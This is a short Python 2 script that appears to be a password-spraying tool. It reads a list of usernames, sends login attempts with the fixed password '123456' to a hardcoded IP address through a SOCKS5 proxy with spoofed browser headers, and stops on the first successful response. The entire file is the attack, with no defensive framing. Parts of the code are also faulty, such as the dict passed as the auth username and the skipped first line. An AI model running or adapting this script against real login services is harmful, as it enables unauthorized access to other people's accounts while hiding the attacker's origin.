import requests
import json
#from pyquery import PyQuery 


top = {
"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linu) Gecko/20100101 Firefox/69.0",
"Accept": "text/css,*/*;q=0.1",
"Accept-Language": "en-US,en;q=0.5",
"Connection": "keep-alive",
"content-type": "text/css; charset=utf-8",
}
text_file = open('listofnames.txt', 'r')
i = 0
list1 = text_file.readline().strip()

while list1 and i < 1:
        list1 = text_file.readline().strip()
        u = unicode(list1, "utf-8")
        user = {'Username': list1}

        address ="http://142.1.44.135:8000/login"
        proxy = {'http': 'socks5://127.0.0.1:1080'}
        auth = requests.auth.HTTPBasicAuth(user, "123456")
         
        #d = requests.get(address)
        r = requests.post(url=address, proxies=proxy, data=user, auth=auth, headers=top)
        
        if r.status_code == 200:
                print(r.status_code)
                i += 1
text_file.close()
